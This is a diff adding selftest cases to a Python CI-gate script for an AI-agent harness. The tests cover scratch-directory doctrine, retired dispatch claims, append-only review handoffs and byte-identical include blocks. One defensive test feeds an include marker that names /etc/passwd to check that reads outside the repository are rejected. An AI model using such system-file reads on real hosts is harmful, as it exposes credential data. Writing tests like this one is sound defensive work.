+        "the retired-claim scan survives a line break inside the phrase",
+        "retired external-tool channel" in retired_dispatch_claim_error(
+            body_text="the append-flag pierces every\nnesting depth, it was claimed."),
+    )
+    expect(
+        "the references file does carry the retired spelling, and the body check still passes",
+        retired_dispatch_claim_error(
+            body_text=(ROOT / "skills/agent-dispatch/references/deferred.md").read_text(
+                encoding="utf-8")) != ""
+        and retired_dispatch_claim_error() == "",
+    )
+    expect(
+        "an empty retired-claim set is a failure, not a clean verdict",
+        retired_dispatch_claim_error(body_text=dispatch_body, retired=()) != "",
+    )
+    expect(
+        "a dispatch body that does not exist is a failure",
+        "missing dispatch body" in _missing_dispatch_body_probe(),
+    )
+    # Same folding, same gap: the retired spelling reappearing in title case is the realistic
+    # regression, and every fixture here was lower-case.
+    expect(
+        "a retired dispatch claim in title case is still caught",
+        retired_dispatch_claim_error(
+            body_text="The Append-To-Subagent-System-Prompt flag is the channel.") != "",
+    )
+    # The folding is two-sided and only one side is reachable from the shipped constants, which
+    # are all lower-case. The needle side is exercised through the parameter, so a mixed-case
+    # entry added to the table later cannot silently stop matching.
+    expect(
+        "a mixed-case entry in the retired table still matches a lower-case body",
+        retired_dispatch_claim_error(
+            body_text="the append-flag is the channel.",
+            retired=("Append-Flag",)) != "",
+    )
+
+    workspace_sources = {
+        relative: (ROOT / relative).read_text(encoding="utf-8")
+        for relative in WORKSPACE_DOCTRINE
+    }
+    guard_text = (ROOT / SPAWN_GUARD_SOURCE).read_text(encoding="utf-8")
+    expect(
+        "worker-workspace doctrine is stated in every file that must carry it",
+        workspace_doctrine_error(source_texts=workspace_sources)[0] == "",
+    )
+    # The table's MEMBERSHIP is part of the claim. Dropping an entry only moves the check
+    # count, and ci-gate's own selftest has no registered floor, so nothing would redden.
+    # A loop over a set cannot see the set shrink: dropping a member drops its own test and
+    # only the check count moves. Membership is pinned separately for every closed set here.
+    expect(
+        "the forbidden runtime-path set covers exactly the reviewed runtimes",
+        RUNTIME_PATHS_FORBIDDEN_IN_SHARED_POLICY == (
+            "~/.claude", "~/.codex", "/private/tmp/claude",
+            ".claude/skills", ".codex/tmp"),
+    )
+    expect(
+        "the retired dispatch-claim set covers exactly the reviewed spellings",
+        RETIRED_DISPATCH_CLAIMS == (
+            "append-to-subagent-system-prompt",
+            "append-flag pierces every nesting depth"),
+    )
+    expect(
+        "the workspace negation set covers exactly the reviewed revocations",
+        FORBIDDEN_WORKSPACE_NEGATIONS == (
+            'workers share one directory',
+            'share one scratch directory',
+            'rule withdrawn',
+            'do not assign per-worker scratch',
+            'a shared scratch directory is fine',
+            'a tree without it passes silently',
+            'a project opts in by carrying the rule',
+        ),
+    )
+    # Keys AND values. The phrase loop below iterates this table, so dropping a phrase drops
+    # its own test and only the check count moves; the keys alone do not see that.
+    expect(
+        "the doctrine table covers exactly the documents and phrases that must carry the rule",
+        tuple(sorted(WORKSPACE_DOCTRINE.items())) == (
+            ('AGENTS.md', (
+                'Every dispatched worker owns an exclusive scratch directory',
+                'The parent never reads a scratch path it did not assign.',
+                '`Scratch: <absolute path>`',
+                'atomically reserves the fresh directory mode 0700',
+            )),
+            ('CLAUDE.md', (
+                'Copy hook sources before',
+                'every subagent inherits that exact path',
+                'the shared root is not a workspace',
+                'defines no `$CLAUDE_SCRATCHPAD` producer',
+            )),
+            ('docs/openai-agents.md', (
+                'Scratch enforcement is activated by the',
+                'Codex hands a subagent no scratch directory.',
+                'name one fresh absent path per worker',
+                'neither shipped runtime uses that weaker mode',
+                'Two calls naming one path cannot both pass.',
+            )),
+            ('skills/agent-dispatch/references/deferred.md', (
+                'a dispatched worker owns its scratch directory',
+                'never read a scratch path you did not assign',
+            )),
+
+        ),
+    )
+    # Every phrase, not just the first: the rest were load-bearing in production and untested.
+    for relative, required in WORKSPACE_DOCTRINE.items():
+        for index, phrase in enumerate(required):
+            stripped = dict(workspace_sources)
+            flexible_phrase = re.escape(phrase).replace(r"\ ", r"\s+")
+            stripped[relative] = re.sub(
+                flexible_phrase, "", stripped[relative], count=1)
+            expect(
+                f"dropping phrase {index} from {relative} turns the doctrine check red",
+                "missing required workspace rule" in workspace_doctrine_error(
+                    source_texts=stripped)[0],
+            )
+    # Every forbidden path, not just the first: shrinking a forbidden set loosens it, and a
+    # deletion sweep cannot see that direction.
+    for path_text in RUNTIME_PATHS_FORBIDDEN_IN_SHARED_POLICY:
+        leaked = dict(workspace_sources)
+        leaked[SHARED_POLICY_DOCUMENT] += f"\nWorkers write under {path_text}/scratch.\n"
+        expect(
+            f"a leaked {path_text} in the shared policy turns the doctrine check red",
+            "names the runtime-specific path" in workspace_doctrine_error(
+                source_texts=leaked)[0],
+        )
+    # The monotone hole: a document can carry every required phrase and revoke the rule.
+    for negation in FORBIDDEN_WORKSPACE_NEGATIONS:
+        revoked = dict(workspace_sources)
+        revoked[SHARED_POLICY_DOCUMENT] += f"\nRevision: {negation}.\n"
+        expect(
+            f"the shared policy revoking the rule with {negation!r} turns the check red",
+            "revokes the rule" in workspace_doctrine_error(source_texts=revoked)[0],
+        )
+    # Every negation fixture was lower-case, so the case folding was decorative: a revocation
+    # written in prose capitalisation is the realistic spelling and went undetected.
+    capitalized = dict(workspace_sources)
+    capitalized[SHARED_POLICY_DOCUMENT] += "\nRevision: Workers Share One Directory now.\n"
+    expect(
+        "a revocation in prose capitalisation still turns the check red",
+        "revokes the rule" in workspace_doctrine_error(source_texts=capitalized)[0],
+    )
+    # A revocation that survives a reflow is the realistic one; single-line fixtures leave the
+    # whitespace normalisation unexercised.
+    reflowed = dict(workspace_sources)
+    reflowed[SHARED_POLICY_DOCUMENT] += "\nRevision: workers share\none directory now.\n"
+    expect(
+        "a revocation broken across lines still turns the check red",
+        "revokes the rule" in workspace_doctrine_error(source_texts=reflowed)[0],
+    )
+    clean_verdict = workspace_doctrine_error(source_texts=workspace_sources)
+    expect(
+        "the shared policy carries no runtime-specific path or negation today",
+        clean_verdict[2] == 0 and clean_verdict[3] == 0,
+    )
+    # The reported document count was never asserted, so the scan could silently narrow while
+    # printing a clean verdict over fewer files than the doctrine names.
+    expect(
+        "the verdict reports one document per doctrine entry",
+        clean_verdict[1] == len(WORKSPACE_DOCTRINE),
+    )
+    # ...and each counter must reach a NONZERO value from its own arm. Read only at zero, both
+    # increments were dead: removing either left every case green.
+    leaked_once = dict(workspace_sources)
+    leaked_once[SHARED_POLICY_DOCUMENT] += "\nWorkers write under ~/.claude/scratch.\n"
+    leaked_verdict = workspace_doctrine_error(source_texts=leaked_once)
+    expect(
+        "one leaked runtime path counts on the path arm and not the negation arm",
+        leaked_verdict[2] == 1 and leaked_verdict[3] == 0,
+    )
+    revoked_once = dict(workspace_sources)
+    revoked_once[SHARED_POLICY_DOCUMENT] += "\nRevision: rule withdrawn.\n"
+    revoked_verdict = workspace_doctrine_error(source_texts=revoked_once)
+    expect(
+        "one revocation counts on the negation arm and not the path arm",
+        revoked_verdict[3] == 1 and revoked_verdict[2] == 0,
+    )
+    # The shared policy must be inside the scan set: absent, the runtime-path and negation arms
+    # assert nothing while reporting a clean verdict.
+    expect(
+        "dropping the shared policy from the scanned set is a failure, not a clean verdict",
+        "absent from the scanned set" in workspace_doctrine_error(
+            source_texts={k: v for k, v in workspace_sources.items()
+                          if k != SHARED_POLICY_DOCUMENT},
+            doctrine={k: v for k, v in WORKSPACE_DOCTRINE.items()
+                      if k != SHARED_POLICY_DOCUMENT})[0],
+    )
+    # The explicit flag and its consumer are the enforcement channel. Repository prose remains
+    # doctrine, never a mutable opt-out bit.
+    expect(
+        "the spawn guard carries the complete explicit activation and reservation path",
+        spawn_guard_activation_error(guard_text) == "",
+    )
+    expect(
+        "dropping required-scratch CLI activation turns the doctrine check red",
+        "explicit scratch activation is incomplete" in workspace_doctrine_error(
+            source_texts=workspace_sources,
+            guard_source=guard_text.replace(
+                'args[0] == "--require-scratch"', 'args[0] == "--optional"', 1))[0],
+    )
+    expect(
+        "restoring repository-controlled marker activation turns the doctrine check red",
+        "repository prose disable" in workspace_doctrine_error(
+            source_texts=workspace_sources,
+            guard_source=guard_text + "\nWORKSPACE_RULE_MARKER = 'opt out'\n")[0],
+    )
+    expect(
+        "a doctrine source that does not exist is a failure",
+        "missing workspace doctrine source" in workspace_doctrine_error(
+            doctrine={"no/such/doctrine.md": ("x",)})[0],
+    )
+    expect(
+        "an empty workspace doctrine table is a failure, not a clean verdict",
+        workspace_doctrine_error(source_texts=workspace_sources, doctrine={})[0] != "",
+    )
+    expect(
+        "an empty negation set is a failure, not a clean verdict",
+        workspace_doctrine_error(
+            source_texts=workspace_sources, negations=())[0] != "",
+    )
+    # The third empty-set arm. Its two siblings were cased and this one was not, so an empty
+    # forbidden-path set left the shared policy unconstrained while reporting clean.
+    expect(
+        "an empty runtime-path forbidden set is a failure, not a clean verdict",
+        workspace_doctrine_error(
+            source_texts=workspace_sources, forbidden_paths=())[0] != "",
+    )
+
+    expect(
+        "review handoff doctrine requires append-only exact-head comments",
+        review_handoff_policy_error(source_texts=handoff_sources) == "",
+    )
+    with tempfile.TemporaryDirectory(prefix="z-harness-handoff-decoy-") as raw:
+        decoy = Path(raw)
+        subprocess.run(["git", "init", "--quiet", str(decoy)], check=True)
+        (decoy / "decoy.md").write_text("decoy\n", encoding="utf-8")
+        prior_git_dir = os.environ.get("GIT_DIR")
+        prior_git_work_tree = os.environ.get("GIT_WORK_TREE")
+        os.environ["GIT_DIR"] = str(decoy / ".git")
+        os.environ["GIT_WORK_TREE"] = str(decoy)
+        try:
+            ambient_sources, ambient_problem = tracked_markdown_sources(ROOT)
+        finally:
+            if prior_git_dir is None:
+                os.environ.pop("GIT_DIR", None)
+            else:
+                os.environ["GIT_DIR"] = prior_git_dir
+            if prior_git_work_tree is None:
+                os.environ.pop("GIT_WORK_TREE", None)
+            else:
+                os.environ["GIT_WORK_TREE"] = prior_git_work_tree
+        expect(
+            "ambient Git selectors cannot substitute the handoff-policy scan root",
+            ambient_problem == "" and "AGENTS.md" in ambient_sources
+            and "decoy.md" not in ambient_sources,
+        )
+
+    class _TrackedMarkdownReply:
+        def __init__(self, returncode=0, stdout=b"", stderr=b""):
+            self.returncode = returncode
+            self.stdout = stdout
+            self.stderr = stderr
+
+    def wrong_markdown_root(_argv, **_kwargs):
+        return _TrackedMarkdownReply(stdout=b"/different/root\n")
+
+    _, wrong_markdown_problem = tracked_markdown_sources(ROOT, runner=wrong_markdown_root)
+    expect(
+        "a Git query naming a different handoff-policy root fails closed",
+        "resolved" in wrong_markdown_problem and "expected" in wrong_markdown_problem,
+    )
+
+    def silent_markdown_inventory(argv, **_kwargs):
+        if "rev-parse" in argv:
+            return _TrackedMarkdownReply(stdout=os.fsencode(ROOT) + b"\n")
+        return _TrackedMarkdownReply(returncode=7)
+
+    _, silent_markdown_problem = tracked_markdown_sources(
+        ROOT, runner=silent_markdown_inventory)
+    expect(
+        "a silent nonzero tracked-markdown inventory fails closed",
+        "git ls-files exited 7" in silent_markdown_problem,
+    )
+    def empty_markdown_inventory(argv, **_kwargs):
+        if "rev-parse" in argv:
+            return _TrackedMarkdownReply(stdout=os.fsencode(ROOT) + b"\n")
+        return _TrackedMarkdownReply(stdout=b"")
+    _, empty_markdown_problem = tracked_markdown_sources(
+        ROOT, runner=empty_markdown_inventory)
+    expect(
+        "a successful empty tracked-markdown inventory fails closed",
+        "empty or unterminated" in empty_markdown_problem,
+    )
+    def unterminated_markdown_inventory(argv, **_kwargs):
+        if "rev-parse" in argv:
+            return _TrackedMarkdownReply(stdout=os.fsencode(ROOT) + b"\n")
+        # Without the required final NUL, blindly dropping the last byte turns this into
+        # the valid tracked path README.md and makes a malformed transport look complete.
+        return _TrackedMarkdownReply(stdout=b"README.mdX")
+    unterminated_sources, unterminated_markdown_problem = tracked_markdown_sources(
+        ROOT, runner=unterminated_markdown_inventory)
+    expect(
+        "a nonempty unterminated tracked-markdown inventory fails before truncation",
+        not unterminated_sources
+        and "empty or unterminated" in unterminated_markdown_problem,
+    )
+    def nul_only_markdown_inventory(argv, **_kwargs):
+        if "rev-parse" in argv:
+            return _TrackedMarkdownReply(stdout=os.fsencode(ROOT) + b"\n")
+        return _TrackedMarkdownReply(stdout=b"\0")
+    _, nul_only_markdown_problem = tracked_markdown_sources(
+        ROOT, runner=nul_only_markdown_inventory)
+    expect(
+        "a NUL-only tracked-markdown inventory fails closed as zero files",
+        "zero files" in nul_only_markdown_problem,
+    )
+    expect(
+        "a required include naming an unregistered document is rejected",
+        "unregistered documents" in review_handoff_policy_error(
+            source_texts=handoff_sources,
+            required_includes={"pr-8/not-registered.md": ()}),
+    )
+    expect(
+        "the frozen PR publication manifest matches its reviewed snapshot",
+        review_publication_manifest_error() == "",
+    )
+    # Deriving the wrong digest from the real one keeps the control valid whatever the
+    # real digest becomes. A fixed sentinel silently stops discriminating on the day the
+    # manifest happens to carry it.
+    forged_digest = ("1" if EXPECTED_FROZEN_PUBLICATION["body_sha256"][0] == "0"
+                     else "0") + EXPECTED_FROZEN_PUBLICATION["body_sha256"][1:]
+    expect(
+        "the forged-digest control differs from the digest it must reject",
+        forged_digest != EXPECTED_FROZEN_PUBLICATION["body_sha256"],
+    )
+    expect(
+        "changing a frozen PR body digest turns the manifest check red",
+        review_publication_manifest_error(dict(
+            EXPECTED_FROZEN_PUBLICATION, body_sha256=forged_digest)) != "",
+    )
+    expect(
+        "removing frozen PR publication metadata turns the manifest check red",
+        review_publication_manifest_error({
+            key: value for key, value in EXPECTED_FROZEN_PUBLICATION.items()
+            if key != "frozen_at_head"
+        }) != "",
+    )
+    missing_append_only = dict(handoff_sources)
+    missing_append_only["skills/outbound-drafts/SKILL.md"] = (
+        missing_append_only["skills/outbound-drafts/SKILL.md"].replace(
+            "Review handoffs are append-only, one exact head per comment.",
+            "Review handoffs summarize the current state.",
+            1,
+        )
+    )
+    expect(
+        "removing the append-only rule turns the doctrine check red",
+        review_handoff_policy_error(source_texts=missing_append_only) != "",
+    )
+    missing_always_on = dict(handoff_sources)
+    missing_always_on["AGENTS.md"] = missing_always_on["AGENTS.md"].replace(
+        "Published pull-request narrative is append-only.",
+        "Published pull-request narrative may be revised.",
+        1,
+    )
+    expect(
+        "removing the always-on append-only rule turns the doctrine check red",
+        review_handoff_policy_error(source_texts=missing_always_on) != "",
+    )
+    mutable_comment_rule = dict(handoff_sources)
+    mutable_comment_rule["skills/outbound-drafts/SKILL.md"] += (
+        "\nOne roll-up comment per PR, edited in place across rounds.\n"
+    )
+    expect(
+        "reintroducing the edit-in-place rule turns the doctrine check red",
+        review_handoff_policy_error(source_texts=mutable_comment_rule) != "",
+    )
+    mutable_body_rule = dict(handoff_sources)
+    mutable_body_rule["contracts/review/README.md"] += (
+        "\nThe description and title are mutable current-state documents.\n"
+    )
+    expect(
+        "reintroducing mutable PR narrative turns the doctrine check red",
+        review_handoff_policy_error(source_texts=mutable_body_rule) != "",
+    )
+    with tempfile.TemporaryDirectory(prefix="z-harness-handoff-policy-") as raw:
+        retired_review_root = Path(raw)
+        (retired_review_root / "pr-8").mkdir()
+        (retired_review_root / "pr-8/rollup.md").write_text(
+            "# mutable handoff\n", encoding="utf-8")
+        expect(
+            "a tracked mutable handoff artifact turns the doctrine check red",
+            review_handoff_policy_error(
+                source_texts=handoff_sources,
+                review_root=retired_review_root,
+            ) != "",
+        )
+    with tempfile.TemporaryDirectory(prefix="z-harness-review-inventory-") as raw:
+        inventory_root = Path(raw)
+
+        def reset_review_inventory():
+            for path in sorted(inventory_root.rglob("*"), reverse=True):
+                if path.is_symlink() or path.is_file():
+                    path.unlink()
+                elif path.is_dir():
+                    path.rmdir()
+            (inventory_root / "pr-8").mkdir(exist_ok=True)
+            (inventory_root / "README.md").write_text("policy\n", encoding="utf-8")
+            (inventory_root / "pr-8/frozen-publication.json").write_text(
+                "{}\n", encoding="utf-8")
+
+        reset_review_inventory()
+        expect("an exact review-document relative-path inventory clears",
+               review_document_inventory_error(inventory_root) == "")
+        (inventory_root / "pr-8/handoff").mkdir()
+        (inventory_root / "pr-8/handoff/description.md").write_text(
+            "nested\n", encoding="utf-8")
+        expect("a nested duplicate description is rejected",
+               review_document_inventory_error(inventory_root) != "")
+        reset_review_inventory()
+        (inventory_root / "pr-9").mkdir()
+        (inventory_root / "pr-9/title.txt").write_text("wrong PR\n", encoding="utf-8")
+        expect("a title under the wrong PR is rejected",
+               review_document_inventory_error(inventory_root) != "")
+        reset_review_inventory()
+        (inventory_root / "pr-8/README.md").write_text("misplaced\n", encoding="utf-8")
+        expect("a misplaced review README is rejected",
+               review_document_inventory_error(inventory_root) != "")
+        reset_review_inventory()
+        (inventory_root / "pr-8/frozen-publication.json").unlink()
+        expect("a missing registered publication snapshot is rejected",
+               review_document_inventory_error(inventory_root) != "")
+        reset_review_inventory()
+        (inventory_root / "pr-8/frozen-publication.json").unlink()
+        os.symlink("../README.md", inventory_root / "pr-8/frozen-publication.json")
+        expect("a registered-path symlink is rejected",
+               review_document_inventory_error(inventory_root) != "")
+        reset_review_inventory()
+        (inventory_root / "pr-8/rollup.md").write_text("mutable\n", encoding="utf-8")
+        expect("the handoff-policy call site adopts exact-path inventory failures",
+               review_handoff_policy_error(
+                   source_texts=handoff_sources, review_root=inventory_root) != "")
+    expect("outbound review text matches the sources it includes", review_include_error() == "")
+    with tempfile.TemporaryDirectory(prefix="z-harness-review-") as raw:
+        review = Path(raw)
+        document = review / "doc.md"
+        # Any tracked file with no include markers of its own. README.md cannot serve here:
+        # it DOCUMENTS the close marker, so it would terminate the block it is embedded in.
+        source_name = "contracts/goldens/digests.json"
+        body = (ROOT / source_name).read_text(encoding="utf-8").strip("\n")
+
+        def review_doc(text: str) -> str:
+            document.write_text(text, encoding="utf-8")
+            return review_include_error(review)
+
+        live = f"{INCLUDE_OPEN}{source_name} -->\n{body}\n{INCLUDE_CLOSE}\n"
+        expect(
+            "an include block byte-identical to its source clears",
+            review_doc(f"# outbound\n\n{live}") == "",
+        )
+        # The production verdict prints these two counts, so they are a published claim
+        # and need something that can falsify them.
+        document.write_text(f"# outbound\n\n{live}", encoding="utf-8")
+        expect(
+            "the include scan reports one document and the one block it graded",
+            review_include_scan(review)[1:] == (1, 1),
+        )
+        document.write_text(f"# outbound\n\n{live}\n{live}", encoding="utf-8")
+        expect(
+            "a second include block moves the reported block count",
+            review_include_scan(review)[1:] == (1, 2),
+        )
+        expect(
+            "an included copy that drifted from its source is caught",
+            "stale copy" in review_doc(f"# outbound\n\n{live}".replace(body, body + "\nx")),
+        )
+        expect(
+            "extra blank lines inside an include are not byte-identical",
+            "stale copy" in review_doc(live.replace(
+                f"\n{INCLUDE_CLOSE}", f"\n\n{INCLUDE_CLOSE}")),
+        )
+        crlf_body = (ROOT / source_name).read_bytes().replace(b"\n", b"\r\n")
+        document.write_bytes(
+            f"{INCLUDE_OPEN}{source_name} -->\n".encode()
+            + crlf_body + f"{INCLUDE_CLOSE}\n".encode())
+        expect(
+            "CRLF normalization cannot satisfy a byte-identical include",
+            "stale copy" in review_include_error(review),
+        )
+        with tempfile.NamedTemporaryFile(
+                dir=ROOT, prefix=".ci-gate-no-final-", suffix=".md",
+                delete=False) as temporary_source:
+            temporary_source.write(b"one line without newline")
+            no_final_path = Path(temporary_source.name)
+        try:
+            no_final_name = str(no_final_path.relative_to(ROOT))
+            expect(
+                "a source without a final newline cannot be line-normalized into place",
+                "stale copy" in review_doc(
+                    f"{INCLUDE_OPEN}{no_final_name} -->\n"
+                    f"one line without newline\n{INCLUDE_CLOSE}\n"),
+            )
+        finally:
+            no_final_path.unlink()
+        expect(
+            "an include cannot read a source outside the repository",
+            "outside the repository" in review_doc(
+                f"{INCLUDE_OPEN}/etc/passwd -->\nx\n{INCLUDE_CLOSE}\n"),
+        )
+        expect(
+            "an include naming a file that does not exist is caught",
+            "does not exist" in review_doc(
+                f"{INCLUDE_OPEN}contracts/goldens/absent.md -->\nx\n{INCLUDE_CLOSE}\n"),
+        )
+        expect(
+            "an include with no closing marker is caught",
+            "unterminated" in review_doc(f"{INCLUDE_OPEN}{source_name} -->\n{body}\n"),
+        )
+        # The convention's own README has to document this syntax, and the only way to show
+        # it is inside a fence. A scanner blind to fences reads that example as a live
+        # include and fails on a file the example never claimed to copy, so the rule's
+        # documentation could never satisfy the rule. This pins that it can.
+        fenced = ("# outbound\n\n```\n"
+                  f"{INCLUDE_OPEN}contracts/goldens/absent.md -->\n"
+                  f"...a byte-identical copy of that file...\n{INCLUDE_CLOSE}\n```\n")
+        expect(
+            "an include shown as a fenced example is not read as a live include",
+            review_doc(fenced) == "",
+        )
+        expect(
+            "a live include after a fenced example is still checked",
+            "stale copy" in review_doc(fenced + "\n" + live.replace(body, "drifted")),
+        )
+        # A block whose BODY carries a fence -- a generated table may. Walking back into the
+        # body instead of resuming past the close marker toggles fence state on that line
+        # and goes blind to every include after it, so the later block must still be seen.
+        # The first block is stale either way; only the SECOND one discriminates.
+        carries_fence = (f"{INCLUDE_OPEN}{source_name} -->\n"
+                         f"drifted\n```\nstill inside the body\n{INCLUDE_CLOSE}\n")
+        expect(
+            "a fence inside included content does not hide a later include",
+            "does not exist" in review_doc(
+                carries_fence + "\n"
+                + f"{INCLUDE_OPEN}contracts/goldens/absent.md -->\nx\n{INCLUDE_CLOSE}\n"),
+        )
+        review_doc(f"# outbound\n\n{live}")
+        expect(
+            "an exact required include inventory clears",
+            review_include_error(
+                review, required_inventory={"doc.md": (source_name,)}) == "",
+        )
+        expect(
+            "removing every required include is not a clean verdict",
+            review_include_error(
+                review, required_inventory={
+                    "doc.md": (source_name,), "missing.md": (source_name,)}) != "",
+        )
+        expect(
+            "an unregistered live include is rejected by the exact inventory",
+            review_include_error(review, required_inventory={}) != "",
+        )
+        document.unlink()
+        expect(
+            "a review directory holding no markdown is a failure, not a clean verdict",
+            review_include_error(review) != "",
+        )
+    expect(
+        "a missing review directory is a failure, not a clean verdict",
+        review_include_error(review) != "",
+    )
+
+    env_line = gated_environment()
+    expect(
+        "the gate names both interpreters its verdicts were measured against",
+        env_line.startswith("CI-GATE-ENV ")
+        and "git=" in env_line and "zsh=" in env_line,
+    )
+    expect(
+        "an absent interpreter is recorded as absent rather than omitted",
+        "zsh=absent" in gated_environment(
+            which=lambda name: None if name == "zsh" else f"/usr/bin/{name}",
+            runner=lambda *a, **k: subprocess.CompletedProcess(
+                a[0], 0, "git version 9.9.9\n", "")),
     )
 
     fake_calls: List[Sequence[str]] = []
@@ -355,12 +5249,12 @@ def selftest() -> int:
         if "bash_command_guard.py" in joined:
             return Result(0, f"SELFTEST-SUMMARY suite=bash_command_guard checks={SUITE_FLOORS['bash_command_guard']} failures=0\n")
         if "git_grep_engine_guard.py" in joined:
-            return Result(0, f"SELFTEST-SUMMARY suite=git_grep_engine_guard checks={SUITE_FLOORS['git_grep_engine_guard']} failures=0\n")
+            return Result(0, f"SELFTEST-SUMMARY suite=git_grep_engine_guard checks={expected_selftest_checks('git_grep_engine_guard')} failures=0\n")
         if "zsh_rev_modifier_guard.py" in joined:
-            return Result(0, f"SELFTEST-SUMMARY suite=zsh_rev_modifier_guard checks={SUITE_FLOORS['zsh_rev_modifier_guard']} failures=0\n")
+            return Result(0, f"SELFTEST-SUMMARY suite=zsh_rev_modifier_guard checks={expected_selftest_checks('zsh_rev_modifier_guard')} failures=0\n")
         if "run-skill-evals.py" in joined:
             return Result(0, f"EVAL-VALIDATE-SUMMARY scenarios={EVAL_SCENARIO_FLOOR} "
-                          f"skills={EVAL_SKILL_FLOOR} failures=0 exit=0\n")
+                          f"skills={EVAL_SKILL_FLOOR} failures=0 scope=shape-only exit=0\n")
         if "--output" in argv:
             return Result(0, "RENDER-SUMMARY action=render targets=5 failures=0 exit=0\n")
         return Result(0, "RENDER-SUMMARY action=verify targets=5 failures=0 exit=0\n")
@@ -370,6 +5264,129 @@ def selftest() -> int:
         gate(fake_runner, emit_child_output=False) == 0,
     )
     expect("production registry is non-empty", len(fake_calls) == 9)
+
+    def timeout_subprocess(argv, **_kwargs):
+        if tuple(argv) == tuple(harness_argv):
+            raise subprocess.TimeoutExpired(
+                cmd=argv, timeout=240, stderr=b"\xffpartial bytes")
+        if tuple(argv) not in {tuple(command) for command, _spec in registered_commands}:
+            return original_subprocess_run(argv, **_kwargs)
+        result = fake_runner(argv)
+        return subprocess.CompletedProcess(
+            argv, result.returncode, result.stdout, result.stderr)
+
+    subprocess.run = timeout_subprocess
+    try:
+        default_runner_timeout_code = gate(emit_child_output=False)
+    finally:
+        subprocess.run = original_subprocess_run
+    expect(
+        "the production gate turns red when its default harness runner times out",
+        default_runner_timeout_code != 0,
+    )
+    # The fake runner above emits the very constants the production check compares against,
+    # so a floor change can never redden it -- the comparison is FLOOR < FLOOR. These arms
+    # emit a corpus one below each floor instead, so the error path executes at least once.
+    def shrunken_scenario_runner(argv):
+        if "run-skill-evals.py" in " ".join(argv):
+            return Result(0, f"EVAL-VALIDATE-SUMMARY scenarios={EVAL_SCENARIO_FLOOR - 1} "
+                          f"skills={EVAL_SKILL_FLOOR} failures=0 scope=shape-only exit=0\n")
+        return fake_runner(argv)
+
+    def shrunken_skill_runner(argv):
+        if "run-skill-evals.py" in " ".join(argv):
+            return Result(0, f"EVAL-VALIDATE-SUMMARY scenarios={EVAL_SCENARIO_FLOOR} "
+                          f"skills={EVAL_SKILL_FLOOR - 1} failures=0 scope=shape-only exit=0\n")
+        return fake_runner(argv)
+
+    expect(
+        "production gate turns red when the eval corpus falls below its scenario floor",
+        gate(shrunken_scenario_runner, emit_child_output=False) != 0,
+    )
+    expect(
+        "production gate turns red when the eval corpus falls below its skill floor",
+        gate(shrunken_skill_runner, emit_child_output=False) != 0,
+    )
+    recorded_harness_floor = SUITE_FLOORS["harness_check"]
+    SUITE_FLOORS["harness_check"] = recorded_harness_floor - 1
+    try:
+        expect(
+            "production gate turns red when its harness floor drifts",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        SUITE_FLOORS["harness_check"] = recorded_harness_floor
+    original_handoff_policy = review_handoff_policy_error
+    globals()["review_handoff_policy_error"] = lambda: "planted handoff-policy failure"
+    try:
+        expect(
+            "production gate adopts the review handoff policy result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["review_handoff_policy_error"] = original_handoff_policy
+    original_ownership_source = repository_ownership_source_error
+    globals()["repository_ownership_source_error"] = (
+        lambda *a, **k: "planted repository-ownership source failure")
+    try:
+        expect(
+            "production gate adopts the repository-ownership source binding",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["repository_ownership_source_error"] = original_ownership_source
+    original_publication_manifest = review_publication_manifest_error
+    globals()["review_publication_manifest_error"] = (
+        lambda: "planted frozen-publication failure")
+    try:
+        expect(
+            "production gate adopts the frozen publication manifest result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["review_publication_manifest_error"] = original_publication_manifest
+    original_publication_workflow = publication_workflow_error
+    globals()["publication_workflow_error"] = (
+        lambda _data: "planted publication-workflow failure")
+    try:
+        expect(
+            "production gate adopts the independent publication workflow result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["publication_workflow_error"] = original_publication_workflow
+    original_mutation_authority = mutation_workflow_authority_error
+    globals()["mutation_workflow_authority_error"] = (
+        lambda _data: "planted mutation-workflow authority failure")
+    try:
+        expect(
+            "production gate adopts the independent mutation workflow authority result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["mutation_workflow_authority_error"] = original_mutation_authority
+    # Both new checks were wired into gate() without a plant, so deleting the call or the
+    # append left the suite green while the gate printed FAIL and exited 0.
+    original_workspace_doctrine = workspace_doctrine_error
+    globals()["workspace_doctrine_error"] = (
+        lambda *a, **k: ("planted workspace-doctrine failure", 4, 0, 0))
+    try:
+        expect(
+            "production gate adopts the worker-workspace doctrine result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["workspace_doctrine_error"] = original_workspace_doctrine
+    original_retired_claim = retired_dispatch_claim_error
+    globals()["retired_dispatch_claim_error"] = (
+        lambda *a, **k: "planted retired-claim failure")
+    try:
+        expect(
+            "production gate adopts the retired dispatch-claim result",
+            gate(fake_runner, emit_child_output=False) != 0,
+        )
+    finally:
+        globals()["retired_dispatch_claim_error"] = original_retired_claim
     def invalid_child_runner(argv: Sequence[str]) -> Result:
         result = fake_runner(argv)
         if "harness_check.py --ci" in " ".join(argv):
